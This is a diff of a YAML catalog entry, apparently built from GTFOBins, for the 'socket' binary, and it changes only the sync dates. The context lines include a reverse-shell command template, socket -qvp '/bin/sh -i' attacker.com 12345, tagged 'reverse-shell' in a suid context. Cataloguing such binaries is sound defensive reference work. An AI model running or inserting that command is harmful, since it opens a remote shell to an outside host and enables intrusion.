@@ -14,7 +14,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-28'
+  last_synced: '2026-08-29'
 commands:
 - template: socket -qvp '/bin/sh -i' attacker.com 12345
 references:
@@ -31,7 +31,7 @@ source_data:
       context: suid
     upstream_url: https://gtfobins.github.io/gtfobins/socket/
     upstream_version: acd5246
-    last_synced: '2026-08-28'
+    last_synced: '2026-08-29'
 enrichment:
   capabilities:
   - value: reverse-shell
@@ -74,6 +74,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-08-28'
+  projected_at: '2026-08-29'
   source_hashes:
     GTFOBins: sha256:cd54849b639877e7b105aff81e43561fbe6e4af40d4db5f9306d7ac6280aa499
